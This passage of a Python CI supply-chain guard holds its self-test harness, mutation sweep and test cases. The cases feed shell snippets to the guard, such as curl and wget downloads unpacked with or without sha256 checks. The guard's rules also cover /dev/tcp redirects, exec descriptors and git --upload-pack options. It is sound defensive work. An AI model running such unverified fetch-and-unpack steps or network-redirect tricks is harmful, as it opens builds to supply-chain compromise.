    "r8 C4: a docker global option is refused": (_r8("docker --context x run --rm alpine:3 id"), None, 1, "global option"),
    "r8 C4: an unknown docker run option is refused": (_r8("docker run --log-opt a alpine:3 id"), None, 1, "option"),
    "r8 C4: docker run of a digest image with listed options passes": (_r8("docker run --rm -d --name n alpine@" + R5_DIGEST), None, 0, ""),
    "r8 C4: docker logs passes": (_r8("docker logs n"), None, 0, ""),
    # --- S1 / S2 / S7: the checksum check is per downloaded file, names the exact file and takes its digest from text.
    "r8 S1: a second download unpacked without its own check is refused": (_r8(R7_FETCH, R7_VERIFY, "curl -fsSL -o g https://x.example/g", "tar xzf g"), None, 1, "own checksum"),
    "r8 S1: two downloads each checked pass": (
        _r8(R7_FETCH, R7_VERIFY, "curl -fsSL -o g https://x.example/g", 'echo "${SUM}  g" | sha256sum -c -', "tar xzf g"), None, 0, ""),
    "r8 S1: a re-download discards the earlier check": (_r8(R7_FETCH, R7_VERIFY, R7_FETCH, "tar xzf f"), None, 1, "own checksum"),
    "r8 S1: a checked file moved keeps its check": (_r8(R7_FETCH, R7_VERIFY, "mv f g", "tar xzf g"), None, 0, ""),
    "r8 S1: an unchecked file moved stays unchecked": (_r8(R7_FETCH, "mv f g", "tar xzf g"), None, 1, "own checksum"),
    "r8 S1: a verify chained with && covers the next command": (_r8(R7_FETCH, R7_VERIFY + " && tar xzf f"), None, 0, ""),
    "r8 S1: a curl inside a command substitution is refused": (_r8("x=$(curl -fsSL https://x.example/i)"), None, 1, "command substitution"),
    "r8 S7: a checklist file the step downloaded does not count": (
        _r8(R7_FETCH, "curl -fsSL -o f.sha256 https://x.example/f.sha256", "sha256sum -c f.sha256", "tar xzf f"), None, 1, "checksum"),
    "r8 S7: a checklist from the repository counts": (_r8(R7_FETCH, "sha256sum -c deploy/f.sha256", "tar xzf f"), None, 0, ""),
    "r8 S7: a digest echoed from a command substitution does not count": (
        _r8(R7_FETCH, 'echo "$(cat f.sum)  f" | sha256sum -c -', "tar xzf f"), None, 1, "cat"),
    "r8 S7: a checklist piped through another command does not count": (
        _r8(R7_FETCH, 'echo "${SUM}  f" | ls | sha256sum -c -', "tar xzf f"), None, 1, "own checksum"),
    "r8 S7: a digest echoed through an inner echo substitution does not count": (
        _r8(R7_FETCH, 'echo "$(echo abc)  f" | sha256sum -c -', "tar xzf f"), None, 1, "own checksum"),
    "r8 S1: a verify two commands before the consumer does not chain": (
        _r8(R7_FETCH, R7_VERIFY + " && echo ok && tar xzf f"), None, 1, "own checksum"),
    "r8 S2: a later step naming a .sha256 file whose base was not fetched is refused": (
        _r7_steps("      - run: curl -fsSL -o f.sha256 https://x.example/f.sha256\n", "      - run: cat f.sha256\n"), None, 1, "f.sha256"),
    "r8 S8: a script path with a dot-dot component is refused": (_r8("bash scripts/../x.sh"), None, 1, "not a script file"),
    "r8 S2: a later step that names the wget default file is refused": (_r7_steps("      - run: wget -q https://x.example/tool\n", "      - run: chmod +x tool\n"), None, 1, "tool"),
    "r8 S2: a wget with -O records the named file": (_r7_steps("      - run: wget -q -O out https://x.example/tool\n", "      - run: chmod +x tool\n"), None, 0, ""),
    "r8 S2: a later step that names the file by a glob is refused": (_r7_steps(R8_TOOL, "      - run: chmod +x too?\n"), None, 1, "tool"),
    "r8 S2: a later sha256sum --version does not cover the file": (_r7_steps(R8_TOOL, "      - run: |\n          sha256sum --version\n          chmod +x tool\n"), None, 1, "checksum"),
    "r8 S2: a later step that checks the exact file passes": (
        _r7_steps(R8_TOOL, "      - run: |\n          echo \"${SUM}  tool\" | sha256sum -c -\n          chmod +x tool\n"), None, 0, ""),
    "r8 S2: a later step cannot be read is refused": (_r7_steps(R8_TOOL, "      - run: |\n          chmod +x tool\n          echo )\n"), None, 1, "cannot read"),
    "r8 S2: the weak companion pattern of a .sha256 pair keeps passing": (
        _r7_steps("      - run: |\n          curl -fsSL -o a https://x.example/a\n          curl -fsSL -o a.sha256 https://x.example/a.sha256\n",
                  "      - run: |\n          ACTUAL=$(sha256sum a | cut -d' ' -f1)\n          test \"$ACTUAL\" = \"$(awk '{print $1}' a.sha256)\"\n"), None, 0, ""),
    # --- C2: a verify inside a function body never runs until called.
    "r8 C2: a verify in an uncalled function does not count": (_r8(R7_FETCH, "g() { " + R7_VERIFY + "; }", "tar xzf f"), None, 1, "checksum"),
    "r8 C2: a verify in a brace group counts": (_r8(R7_FETCH, "{ " + R7_VERIFY + "; }", "tar xzf f"), None, 0, ""),
}


def self_test(root: Path) -> int:
    failures = unit_checks()
    missing = [rel for rel in INPUT_FILES if not (root / rel).is_file()]
    if missing:
        print(f"check_release_features: self-test FAIL: missing inputs under {root}: {', '.join(missing)}", file=sys.stderr)
        return 1
    # Scratch lives under $TMPDIR, else the repo-local .local-runs (never /tmp).
    base = os.environ.get("TMPDIR") or str(root / ".local-runs")
    Path(base).mkdir(parents=True, exist_ok=True)
    with tempfile.TemporaryDirectory(prefix="relfeat-selftest.", dir=base) as td:
        tmp = Path(td)

        # --- runtime fail-closed: a failing/empty declaration must abort the
        # allowed build step and the Dockerfile RUN under `set -e`. (The guard
        # pins the real files to these exact statements, see the unmutated case.)
        build_body = "\n".join(WF_BUILD).replace("${{ matrix.target }}", "x").replace("cargo build", "echo cargo-build")
        docker_body = (
            DOCKER_RUN[len("RUN ") :]
            .replace("cargo build", "echo cargo-build")
            .replace("strip target", "echo strip target")
            .replace("bash scripts/assert-compiled-features.sh", "echo assert")
        )
        (tmp / "scripts").mkdir()
        for label, body, shell in (("build step", build_body, "bash"), ("Dockerfile RUN", docker_body, "sh")):
            shutil.copy2(root / DECL, tmp / DECL)
            ok = subprocess.run([shell, "-c", "set -e; " + body], cwd=tmp, capture_output=True).returncode == 0
            if not ok:
                print(f"self-test FAIL: {label} does not pass with the real declaration", file=sys.stderr)
                failures += 1
            for mutant in ("exit 1", "true", 'echo ""; exit 0'):
                (tmp / DECL).write_text(mutant + "\n", encoding="utf-8")
                rc = subprocess.run([shell, "-c", "set -e; " + body], cwd=tmp, capture_output=True).returncode
                if rc == 0:
                    print(f"self-test FAIL: {label} PASSED with a broken declaration ({mutant}): fail-open", file=sys.stderr)
                    failures += 1

        # --- the guard itself: positive controls and every bypass form.
        for name, (want, edits) in CASES.items():
            case_root = tmp / "case"
            mk_root(root, case_root)
            try:
                for rel, old, new, every in edits:
                    mutate_file(case_root / rel, old, new, every)
            except (RuntimeError, ValueError) as exc:
                print(f"self-test FAIL: case '{name}': {exc}", file=sys.stderr)
                failures += 1
                continue
            try:
                errs, _ = run_guard(case_root)
                got = "fail" if errs else "pass"
            except InputError:
                errs, got = [], "input-error"
            if got != want:
                print(f"self-test FAIL: guard case '{name}' wanted {want}, got {got}: {errs[:2]}", file=sys.stderr)
                failures += 1

        for name, (advisory, want, edits) in ADVISORY_CASES.items():
            case_root = tmp / "case"
            mk_root(root, case_root)
            for rel, old, new, every in edits:
                mutate_file(case_root / rel, old, new, every)
            errs, _ = run_guard(case_root, advisory)
            if ("fail" if errs else "pass") != want:
                print(f"self-test FAIL: '{name}' wanted {want}: {errs[:2]}", file=sys.stderr)
                failures += 1
        for name, (edits, count, needle) in MESSAGE_CASES.items():
            case_root = tmp / "case"
            mk_root(root, case_root)
            for rel, old, new, every in edits:
                mutate_file(case_root / rel, old, new, every)
            errs, _ = run_guard(case_root)
            if len(errs) != count or needle not in errs[0]:
                print(f"self-test FAIL: '{name}' wanted {count} message(s) containing {needle!r}: {errs[:3]}",
                      file=sys.stderr)
                failures += 1

        for name, (edits, needle) in JOINED_CASES.items():
            case_root = tmp / "case"
            mk_root(root, case_root)
            for rel, old, new, every in edits:
                mutate_file(case_root / rel, old, new, every)
            errs, _ = run_guard(case_root)
            if needle not in " | ".join(errs):
                print(f"self-test FAIL: '{name}' wanted a message containing {needle!r}: {errs[:3]}", file=sys.stderr)
                failures += 1

        for name, (doc_text, files, count, needle) in R5_CASES.items():
            errs = r5_errors(doc_text, files, tmp / "r5")
            if len(errs) != count or (needle and needle not in " | ".join(errs)):
                print(f"self-test FAIL: '{name}' wanted {count} message(s) containing {needle!r}: {errs[:3]}",
                      file=sys.stderr)
                failures += 1

        for name, (doc_text, files, count, needle) in R7_CASES.items():
            errs = r5_errors(doc_text, files, tmp / "r7")
            if len(errs) != count or (needle and needle not in " | ".join(errs)):
                print(f"self-test FAIL: '{name}' wanted {count} message(s) containing {needle!r}: {errs[:3]}",
                      file=sys.stderr)
                failures += 1

        for name, (doc_text, files, count, needle) in R8_CASES.items():
            errs = r5_errors(doc_text, files, tmp / "r8")
            if len(errs) != count or (needle and needle not in " | ".join(errs)):
                print(f"self-test FAIL: '{name}' wanted {count} message(s) containing {needle!r}: {errs[:3]}",
                      file=sys.stderr)
                failures += 1
        if RUN_ALLOWED != tuple(sorted(RUN_ALLOWED)):
            print("self-test FAIL: RUN_ALLOWED is not sorted", file=sys.stderr)
            failures += 1

        # --- through the real entry point: exit codes for unreadable input.
        for name, (setup, want_rc) in ENTRY_CASES.items():
            case_root = tmp / "entry"
            mk_root(root, case_root)
            setup(case_root)
            rc = subprocess.run([sys.executable, str(Path(__file__).resolve()), str(case_root)], capture_output=True).returncode
            if rc != want_rc:
                print(f"self-test FAIL: '{name}' exited {rc}, wanted {want_rc}", file=sys.stderr)
                failures += 1
    if failures:
        return 1
    print(
        "check_release_features: self-test OK "
        f"(a failing or empty declaration fails the build step and the Dockerfile RUN; "
        f"{len(CASES)} guard cases, {len(ADVISORY_CASES)} advisory cases, {len(MESSAGE_CASES)} message cases, "
        f"{len(PARITY)} parity cases, {len(SCALARS)} scalar cases, {len(ENTRY_CASES)} entry-point cases, "
        f"{len(R5_CASES)} round-5/6 cases, {len(R7_CASES)} round-7 cases, {len(R8_CASES)} round-8 cases, {len(JOINED_CASES)} joined cases)"
    )
    return 0


# ---------------------------------------------------------- mutation sweep --
def _refusal_sites(src: bytes) -> List[Tuple[int, int, int]]:
    """(line, start, end) byte span of the ``<x>.bad`` callee of every refusal call."""
    starts = [0]
    for m in re.finditer(b"\n", src):
        starts.append(m.end())
    sites: List[Tuple[int, int, int]] = []
    for node in ast.walk(ast.parse(src)):
        if isinstance(node, ast.Call) and isinstance(node.func, ast.Attribute) and node.func.attr == "bad":
            f = node.func
            end_line = f.end_lineno if f.end_lineno is not None else f.lineno
            end_col = f.end_col_offset if f.end_col_offset is not None else f.col_offset
            sites.append((f.lineno, starts[f.lineno - 1] + f.col_offset, starts[end_line - 1] + end_col))
    return sorted(sites)


def mutation_sweep(root: Path) -> int:
    """Neutralise each refusal call of this script in turn (``x.bad(...)`` becomes
    a no-op) and require ``--self-test`` to fail. A survivor is a refusal that no
    case proves. Prints ``N mutants, S survivors``; exit 1 when S > 0."""
    me = Path(__file__).resolve()
    src = me.read_bytes()
    sites = _refusal_sites(src)
    base = os.environ.get("TMPDIR") or str(root / ".local-runs")
    Path(base).mkdir(parents=True, exist_ok=True)
    with tempfile.TemporaryDirectory(prefix="relfeat-sweep.", dir=base) as td:
        tmp = Path(td)
        control = subprocess.run([sys.executable, str(me), "--self-test", str(root)], capture_output=True, text=True)
        if control.returncode != 0:
            print("check_release_features: sweep aborted: the unmutated self-test is not green", file=sys.stderr)
            print(control.stderr, file=sys.stderr)
            return 1

        def run(item: Tuple[int, Tuple[int, int, int]]) -> Tuple[int, int, bool]:
            k, (line, start, end) = item
            mutant = tmp / f"mutant_{k}.py"
            mutant.write_bytes(src[:start] + b"(lambda *_a, **_k: None)" + src[end:])
            res = subprocess.run([sys.executable, str(mutant), "--self-test", str(root)], capture_output=True, text=True)
            return k, line, res.returncode != 0

        with ThreadPoolExecutor(max_workers=max(1, min(4, os.cpu_count() or 1))) as pool:
            results = sorted(pool.map(run, list(enumerate(sites))))
    survivors = [line for _, line, killed in results if not killed]
    for k, line, killed in results:
        print(f"site {k:3d} line {line:4d}: {'killed' if killed else 'SURVIVED'}")
    cond_total, cond_survivors = condition_sweep(root, src)
    print(f"check_release_features: mutation sweep: {len(results)} refusal mutants + {cond_total} condition mutants = "
          f"{len(results) + cond_total} mutants, {len(survivors) + len(cond_survivors)} survivors")
    if survivors or cond_survivors:
        print(f"check_release_features: surviving refusal sites at lines {survivors}, condition mutants {cond_survivors}",
              file=sys.stderr)
        return 1
    return 0


def condition_sweep(root: Path, src: bytes) -> Tuple[int, List[str]]:
    """Apply each CONDITION_MUTANTS entry (exact-once text substitution above CONDITION_MARKER)
    and require ``--self-test`` to fail. An anchor that is not found exactly once is itself a survivor."""
    me = Path(__file__).resolve()
    text = src.decode("utf-8")
    cut = text.index(CONDITION_MARKER + "\n")
    head, tail = text[:cut], text[cut:]
    base = os.environ.get("TMPDIR") or str(root / ".local-runs")
    Path(base).mkdir(parents=True, exist_ok=True)
    survivors: List[str] = []
    with tempfile.TemporaryDirectory(prefix="relfeat-cond.", dir=base) as td:
        tmp = Path(td)

        def run(item: Tuple[int, Tuple[str, str, str]]) -> Tuple[int, str, str]:
            k, (desc, old, new) = item
            if head.count(old) != 1:
                return k, desc, f"SURVIVED (anchor found {head.count(old)} times, not once)"
            mutant = tmp / f"cond_{k}.py"
            mutant.write_text(head.replace(old, new, 1) + tail, encoding="utf-8")
            res = subprocess.run([sys.executable, str(mutant), "--self-test", str(root)], capture_output=True, text=True)
            return k, desc, "killed" if res.returncode != 0 else "SURVIVED"

        with ThreadPoolExecutor(max_workers=max(1, min(4, os.cpu_count() or 1))) as pool:
            results = sorted(pool.map(run, list(enumerate(CONDITION_MUTANTS))))
    for k, desc, state in results:
        print(f"condition {k:3d} {desc}: {state}")
        if state != "killed":
            survivors.append(f"{k} ({desc})")
    del me
    return len(results), survivors




# Condition mutants: (description, anchor, replacement). The sweep above only neutralises refusal CALLS;
# these change a CONDITION or a regex, which that sweep cannot see. Each anchor must occur exactly once in
# the source ABOVE the marker line below (so the table never matches itself); the mutant is killed when
# --self-test exits non-zero.
CONDITION_MARKER = "# --- end of condition mutants"
# --- end of condition mutants
CONDITION_MUTANTS: Tuple[Tuple[str, str, str], ...] = (
    ("double-quoted backslash test never fires", 'if style == "double" and "\\\\" in v:', "if False:"),
    ("single-quoted '' is not decoded", 'v[1:-1].replace("\'\'", "\'")', "v[1:-1]"),
    ("single-quoted style test never fires", 'if style == "single":', "if False:"),
    ("continuation noise never recorded", "            if open_:\n", "            if False:\n"),
    ("--mount refusal is case-sensitive", '"--mount" in ins.lower()', '"--mount" in ins'),
    ("--mount refused only right after RUN", 'if "--mount" in ins.lower():', 'if ins.lower().startswith("run --mount"):'),
    ("FROM variable refusal never fires", 'if "$" in image:', "if False:"),
    ("FROM variable refusal sees only ${", 'if "$" in image:', 'if "${" in image:'),
    ("empty instruction at end of file inside a continuation dropped", "    if buf is not None:\n        out.append((start, len(lines), _collapse(buf)))", "    if buf is not None and buf.strip(\" \\t\"):\n        out.append((start, len(lines), _collapse(buf)))"),
    ("instruction word is not case-folded", 'word = ins.split(" ", 1)[0].upper()', 'word = ins.split(" ", 1)[0]'),
    ("final-stage binary COPY count not compared", "if len(copies) != 1:", "if False:"),
    ("proof order against the build not compared", "if builds and proofs and proofs[0] < builds[0]:", "if False:"),
    ("proof URL placeholder accepts any URL", "SHAPE_URL_RE.fullmatch(lines[1])", "True"),
    ("proof norm drops statements after the URL", "if len(lines) == len(SHAPE_PROOF) and SHAPE_URL_RE", "if len(lines) >= 3 and SHAPE_URL_RE"),
    ("proof URL sslmode not pinned", r"\?sslmode=verify-full", r"\?sslmode=[a-z-]+"),
    ("proof URL sslrootcert not pinned", r"&sslrootcert=\$\{PGTLS_DIR\}/ca\.crt", r"&sslrootcert=[^\"]*"),
    ("pinned step name expression allowed", 'if name is not None and "${{" in name.text():\n        why.bad("the step', 'if False:\n        why.bad("the step'),
    ("quoted build tool spelling not unquoted (release job)", "BUILD_TOOL_RE.search(unquoted(t))", "BUILD_TOOL_RE.search(t)"),
    ("quoted build tool spelling not unquoted (Dockerfile)", "BUILD_TOOL_RE.search(unquoted(ins))", "BUILD_TOOL_RE.search(ins)"),
    ("KEY_RE accepts a space before the colon", 'KEY_RE = re.compile(r"(?P<key>[A-Za-z_][A-Za-z0-9_-]*):', 'KEY_RE = re.compile(r"(?P<key>[A-Za-z_][A-Za-z0-9_-]*) ?:'),
    ("SHAPE_ADVISORY flipped", "SHAPE_ADVISORY = True", "SHAPE_ADVISORY = False"),
    ("advisory default ignored", "        advisory = SHAPE_ADVISORY\n", "        advisory = False\n"),
    ("advisory branch always taken", "    if advisory:\n", "    if True:\n"),
    ("required state never refuses the key", "    elif coe is not None:\n", "    elif False:\n"),
    ("pinned scalar style not compared", 'node.kind == "scalar" and node.style == style and', 'node.kind == "scalar" and'),
    ("pinned block style not compared", 'node.kind == "block" and node.style == "|" and', 'node.kind == "block" and'),
    ("pinned mapping key set not compared", "if set(node.keys()) != set(spec):", "if False:"),
    ("pinned sequence length not compared", "if items is None or len(items) != len(spec):", "if items is None:"),
    ("pinned no-value key not compared", 'return "" if node.kind == "null" else', 'return "" if True else'),
    ("docker step count not compared", "if len(items) != len(DOCKER_STEPS):", "if False:"),
    ("action SHA bump not recognised", 'uses.text().split("@")[0] == want.split("@")[0]', "False"),
    ("canonical RUN physical lines not compared", "if tuple(raw[first - 1:last]) == DOCKER_RUN_LINES:", "if True:"),
    ("continuations outside the canonical RUN allowed", "        if n not in canon_lines:\n", "        if False:\n"),
    ("run continuation check never fires", 'if text.rstrip(" \\t").endswith("\\\\"):', "if False:"),
    ("registry allowed outside the docker job", "if not in_docker and REGISTRY in text.lower():", "if False:"),
    ("registry name compared case-sensitively", "REGISTRY in text.lower()", "REGISTRY in text"),
    ("secret name not compared", 'm.group("name") not in RELEASE_SECRETS or ', ""),
    ("secret reference shape not compared", ' or m.group(0) != "secrets." + str(m.group("name"))', ""),
    ("secrets key never refused", 'if path and path[-1].lower() == "secrets":', "if False:"),
    ("reusable workflow job never refused", 'if job.get("uses") is not None:', "if False:"),
    ("shell join on any trailing backslash", '(len(raw) - len(raw.rstrip("\\\\"))) % 2 == 1', 'raw.endswith("\\\\")'),
    ("BuildKit join strips the next line's indent", "            piece = raw\n", '            piece = raw.lstrip(" \\t")\n'),
    ("BuildKit continuation needs a bare backslash", r'BK_CONT_RE = re.compile(r"(^|[^\\])\\[ \t]*$")', r'BK_CONT_RE = re.compile(r"(^|[^\\])\\$")'),
    ("BuildKit continuation on an escaped backslash", r'(^|[^\\])\\[ \t]*$', r'\\[ \t]*$'),
    ("per-action key not case-folded", 'USES_BY_ACTION.get("/".join(seg.lower() for seg in segs[:2]))',
     'USES_BY_ACTION.get("/".join(seg for seg in segs[:2]))'),
    ("per-action key includes the subpath", 'for seg in segs[:2]))', 'for seg in segs[:3]))'),
    ("per-action sha not compared", 'if want is not None and sha != want.partition("@")[2] and not', 'if False and not'),
    ("local action outside the tree allowed", 'if tree != target and tree not in target.parents:', 'if False:'),
    ("local action cycle not refused", 'if target in chain:', 'if False:'),
    ("local action depth not limited", 'MAX_LOCAL_DEPTH = 8  # nested', 'MAX_LOCAL_DEPTH = 80  # nested'),
    ("local action.yaml not read", 'for f in ("action.yml", "action.yaml")', 'for f in ("action.yml",)'),
    ("local action treated as a plain ref", 'if ref.startswith("./"):', 'if False:'),
    ("docker use not exempt from the segment check", 'if spec.startswith("docker://"):\n        return', 'if False:\n        return'),
    ("node main may escape the action", '(target != entry and target not in entry.parents) or ', 'False or '),
    ("node main need not exist", ' or not entry.is_file():', ':'),
    ("needs list members not typed", 'all(n.kind == "scalar" for n in needs.value)', 'True'),
    ("needs mapping allowed", 'needs.kind == "scalar" or (', 'True or ('),
    ("reusable workflow job needs steps", 'if job.get("uses") is not None and steps is None:', 'if False:'),
    ("expression path shape not checked", 'if not EXPR_PATH_RE.fullmatch(path):', 'if False:'),
    ("matrix key need not be in the matrix", 'return len(parts) == 2 and parts[1] in ctx.matrix', 'return len(parts) == 2'),
    ("matrix path length not checked", 'return len(parts) == 2 and parts[1] in ctx.matrix', 'return parts[1] in ctx.matrix'),
    ("secrets path length not checked", 'return len(parts) == 2\n    if parts[0] == "steps":', 'return True\n    if parts[0] == "steps":'),
    ("steps path length not checked", 'return len(parts) == 4 and parts[2] == "outputs" and', 'return parts[2] == "outputs" and'),
    ("steps path need not be outputs", 'return len(parts) == 4 and parts[2] == "outputs" and', 'return len(parts) == 4 and'),
    ("steps id need not be safe", 'and parts[1] in ctx.safe and parts[1] not in ctx.tainted', 'and parts[1] not in ctx.tainted'),
    ("steps id may be tainted", 'and parts[1] in ctx.safe and parts[1] not in ctx.tainted', 'and parts[1] in ctx.safe'),
    ("tainting env refs ignored", 'dirty = bool(TAINT_ENV_RE.search(body)) or not all(', 'dirty = False or not all('),
    ("tainting expressions ignored", 'or not all(expr_allowed(e, ctx) for e in step_exprs(step))', 'or False'),
    ("taint does not spread", 'tainted.add(sid)\n                changed = True', 'tainted.add(sid)\n                changed = False'),
    ("here-document in a fetch step allowed", 'if scan.heredocs:', 'if False:'),
    ("dangerous assignment in a fetch step allowed", 'if DANGEROUS_ASSIGN_RE.fullmatch(name):', 'if False:'),
    ("GITHUB_ENV write in a fetch step allowed", 'if any(FETCH_FILE_RE.search(w) for w in scan.words):', 'if False:'),
    ("fetch command allow-list not applied", 'if not literal or word not in FETCH_ALLOWED:', 'if False:'),
    ("fetch command may be non-literal", 'if not literal or word not in FETCH_ALLOWED:', 'if word not in FETCH_ALLOWED:'),
    ("tar options not checked", 'if word == "tar":', 'if False:'),
    ("git clone is not a fetch", 'clone = any(w == "git" and', 'clone = False and any(w == "git" and'),
    ("runs-on label list not applied", 'ok = text in HOSTED_RUNNERS', 'ok = bool(text)'),
    ("runs-on matrix may be empty", 'ok = bool(values) and all(v in HOSTED_RUNNERS for v in values)', 'ok = all(v in HOSTED_RUNNERS for v in values)'),
    ("runs-on matrix values not checked", 'ok = bool(values) and all(v in HOSTED_RUNNERS for v in values)', 'ok = bool(values)'),
    ("runs-on flow list accepted", 'if ro.kind == "scalar" and ro.style == "plain" else ""', 'if ro.kind == "scalar" else ""'),
    ("forbidden triggers allowed", 'bad = [t for t in on_triggers(on) if t in ON_FORBIDDEN]', 'bad = []'),
    ("on: pin not compared", 'if pin is not None and json.dumps(', 'if False and json.dumps('),
    ("local action walked more than once", 'if target in rep.walked:', 'if False:'),
    ("image digest length not pinned", r'IMAGE_DIGEST_RE = re.compile(r"[a-z0-9][a-z0-9._/:-]*@sha256:[0-9a-f]{64}")',
     r'IMAGE_DIGEST_RE = re.compile(r"[a-z0-9][a-z0-9._/:-]*@sha256:[0-9a-f]+")'),
    ("docker action digest length not pinned", r'DOCKER_USES_RE = re.compile(r"docker://[a-z0-9][a-z0-9_./:-]*@sha256:[0-9a-f]{64}")',
     r'DOCKER_USES_RE = re.compile(r"docker://[a-z0-9][a-z0-9_./:-]*@sha256:[0-9a-f]+")'),
    ("container never inspected", 'if container is not None:', 'if False:'),
    ("dot segment not refused",'if any(seg in ("", ".", "..") for seg in segs):', 'if any(seg in ("",) for seg in segs):'),
    # --- Round 7
    ("job and workflow env never taint", 'env_dirty or dirty', 'dirty'),
    ("workflow env not read", '(doc.get("env"), job.get("env"))', '(job.get("env"),)'),
    ("job env not read", '(doc.get("env"), job.get("env"))', '(doc.get("env"),)'),
    ("GITHUB_ENV relay ignored", 'dirty or relay or', 'dirty or False or'),
    ("file relay ignored", 'any(n in body for n in names)', 'False'),
    ("unreadable relay ignored", '"\\0unreadable" in names', 'False'),
    ("legacy set-output not a writer", 'writer = "GITHUB_OUTPUT" in body or "set-output" in body', 'writer = "GITHUB_OUTPUT" in body'),
    ("pwsh shell allowed", 'SHELL_ALLOWED = ("bash", "sh")', 'SHELL_ALLOWED = ("bash", "sh", "pwsh", "python")'),
    ("windows run needs no shell", 'elif ctx.windows and not ctx.default_shell:', 'elif False:'),
    ("windows default shell ignored", 'elif ctx.windows and not ctx.default_shell:', 'elif ctx.windows:'),
    ("windows runner label not read", 'return text.startswith("windows")', 'return False'),
    ("windows matrix leg not read", 'return any(v.lower().startswith("windows") for v in matrix_os_values(job))', 'return False'),
    ("expression matrix value allowed", 'if matrix is not None and any("${{" in t for t in node_texts(matrix)):', 'if False:'),
    ("dev tcp redirect allowed", 'if DEV_NET_RE.search(raw) or EXEC_FD_RE.search(raw):', 'if EXEC_FD_RE.search(raw):'),
    ("exec descriptor allowed", 'if DEV_NET_RE.search(raw) or EXEC_FD_RE.search(raw):', 'if DEV_NET_RE.search(raw):'),
    ("downloaded file matched by substring", 'parts = {p for w in words for p in re.split(r"[/=:]", w)}', 'parts = {p for w in words for p in [w] + [w[:k] for k in range(len(w))]}'),
    ("downloads not remembered", 'ctx.fetched.add(base)', 'pass'),
    ("computed redirect allowed", 'if "$" in target or "`" in target:', 'if False:'),
    ("bin directory allowed", 'if w not in tar_dirs and not URL_RE.match(w) and BIN_DIR_RE.search(w):', 'if False:'),
    ("tar -C directory refused", 'if w not in tar_dirs and not URL_RE.match(w) and BIN_DIR_RE.search(w):', 'if not URL_RE.match(w) and BIN_DIR_RE.search(w):'),
    ("url with a bin path refused", 'if w not in tar_dirs and not URL_RE.match(w) and BIN_DIR_RE.search(w):', 'if w not in tar_dirs and BIN_DIR_RE.search(w):'),
    ("verify may sit in a subshell", 'if is_verify(word, args) and info["top"] and', 'if is_verify(word, args) and'),
    ("negated verify counts", 'and not start["neg"] and', 'and'),
    ("verify may follow &&", 'start["prev"] in ("\\n", ";"):', 'start["prev"] in ("\\n", ";", "&&", "||"):'),
    ("pipeline start not followed", 'while first > 0 and scan.info[first]["prev"] == "|":', 'while False:'),
    ("docker run of a tag allowed", 'if not (IMAGE_DIGEST_RE.fullmatch(image) or image in local):', 'if False:'),
    ("docker run of any local tag refused", 'if not (IMAGE_DIGEST_RE.fullmatch(image) or image in local):', 'if not IMAGE_DIGEST_RE.fullmatch(image):'),
    ("function definition refused", 're.fullmatch(r"\\w+", name[0]) and re.match(', 're.fullmatch(r"\\w+", name[0]) and False and re.match('),
    ("walked action keeps no height", 'if len(chain) + height > MAX_LOCAL_DEPTH:', 'if False:'),
    ("walked action height forgotten", 'height = rep.heights.get(target, 1)', 'height = 1'),
    ("cycle not refused", 'if target in chain:', 'if False:'),
    ("depth limit raised", 'if len(chain) >= MAX_LOCAL_DEPTH:', 'if len(chain) >= 80:'),
    ("arithmetic body not walked", 'return self.walk_arithmetic(i)', 'self.i = self.s.index("))", i) + 2\n            return "$(())"'),
    ('tar long option not checked', 'good = TAR_LONG_RE.fullmatch(arg) is not None', 'good = True'),
    ('tar first argument not checked', 'good = arg.startswith("-") or n == 0', 'good = True'),
    ('downloaded file never looked for', 'if f in parts or any(glob_hit(f, p) for p in parts)', 'if any(glob_hit(f, p) for p in parts)'),
    ('downloaded file glob never looked for', 'if f in parts or any(glob_hit(f, p) for p in parts)', 'if f in parts'),
    ('glob needs no other character', 'and bool(part.strip("*?[]")) and', 'and True and'),
    ('later step needs no checksum', 'if hit in verified or (hit.endswith(".sha256") and hit[:-len(".sha256")] in ctx.fetched):', 'if True:'),
    ('sha256 companion of any name exempt', 'and hit[:-len(".sha256")] in ctx.fetched):', 'and True):'),
    ('consumer of a named file needs no checksum', 'missing = [n for n in named if n not in covered]', 'missing = []'),
    ('consumer of no named file needs no checksum', 'elif not (any_ok or chained):', 'elif False:'),
    ('verify and consumer chain refused', 'extra = chain[1] if chained and chain is not None else set()', 'extra = set()'),
    ('chain must be adjacent', 'chain[0] == k - 1 and info["prev"] == "&&"', 'info["prev"] == "&&"'),
    ('output over a command name allowed', 'if base_of(out) in FETCH_ALLOWED:', 'if False:'),
    ('gh any subcommand allowed', 'if plain[:1] == ["api"] or plain[:2] == ["attestation", "verify"]:', 'if True:'),
    ('gh api refused', 'if plain[:1] == ["api"] or plain[:2] == ["attestation", "verify"]:', 'if plain[:2] == ["attestation", "verify"]:'),
    ('gh attestation verify refused', 'if plain[:1] == ["api"] or plain[:2] == ["attestation", "verify"]:', 'if plain[:1] == ["api"]:'),
    ('script flags skipped', 'while word != "source" and n < len(args) and flags.fullmatch(args[n][0]):', 'while False:'),
    ('script path unchecked', 'if not ok or ".." in path:', 'if False:'),
    ('script dot-dot allowed', 'if not ok or ".." in path:', 'if not ok:'),
    ('function body counted as top level', 'lv.stack.append("fn" if text == "{" and lv.fn_next else text)', 'lv.stack.append(text)'),
    ('function body not in the top-level test', 'any(k in ("if", "while", "until", "case", "fn") for k in lv.stack)', 'any(k in ("if", "while", "until", "case") for k in lv.stack)'),
    ('docker global option allowed', 'if not texts or texts[0].startswith("-"):\n        return "`docker`', 'if not texts:\n        return "`docker`'),
    ('docker unknown option allowed', 'elif tok.split("=")[0] not in DOCKER_VALUE_OPTS and tok not in DOCKER_FLAG_OPTS:', 'elif False:'),
    ('docker subcommand list not applied', 'if sub not in RUN_DOCKER:', 'if False:'),
    ('git global option allowed', 'if not texts or texts[0].startswith("-"):\n        return "`git`', 'if not texts:\n        return "`git`'),
    ('git subcommand list not applied', 'if texts[0] not in RUN_GIT:', 'if False:'),
    ('git program option allowed', 'if any(a.split("=")[0] in ("--upload-pack", "--receive-pack", "--exec") for a in texts):', 'if False:'),
    ('git config any key allowed', 'if keys[:1] not in (["user.name"], ["user.email"]):', 'if False:'),
    ('cargo --config allowed', 'if any(a == "--config" or a.startswith("--config=") for a in texts):', 'if False:'),
    ('cargo subcommand list not applied', 'if not plain or plain[0] not in RUN_CARGO:', 'if False:'),
    ('cargo install unlocked', 'if not (crates and locked and version):', 'if not crates:'),
    ('cargo install any crate', 'elif arg.startswith("-") or arg not in RUN_CARGO_CRATES:', 'elif arg.startswith("-"):'),
    ('echoed checklist from a download allowed', 'if any(base_of(f) in downloaded for f in files):', 'if False:'),
